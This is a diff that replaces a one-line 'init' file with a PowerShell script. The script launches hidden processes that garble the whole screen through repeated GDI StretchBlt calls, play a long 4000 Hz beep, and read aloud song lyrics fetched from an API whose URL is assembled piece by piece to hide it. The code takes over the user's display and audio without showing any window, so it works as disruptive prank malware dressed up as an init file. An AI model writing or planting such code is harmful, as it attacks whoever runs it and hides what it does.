@@ -1,1 +1,15 @@
-init
+Start-Process powershell -WindowStyle Hidden -ArgumentList @(
+    '-NoProfile',
+    '-Command',
+    '$x=[char]47;$d=''lrc''+''lib''+[char]46+''net'';$u=''h''+''ttps:''+$x+$x+$d+$x+''api''+$x+''get''+$x+24036888;(New-Object -Com SAPI.SpVoice).Speak((irm $u).plainLyrics)'
+)
+
+Start-Process python -WindowStyle Hidden -ArgumentList @(
+    '-c',
+    'import ctypes as c; g=c.windll.gdi32; u=c.windll.user32; d=u.GetDC(0); [g.StretchBlt(d,5,5,1910,1070,d,0,0,1920,1080,0x999999) for _ in range(10000)]'
+)
+
+Start-Process python -WindowStyle Hidden -ArgumentList @(
+    '-c',
+    'import winsound; winsound.Beep(4000,100000)'
+)
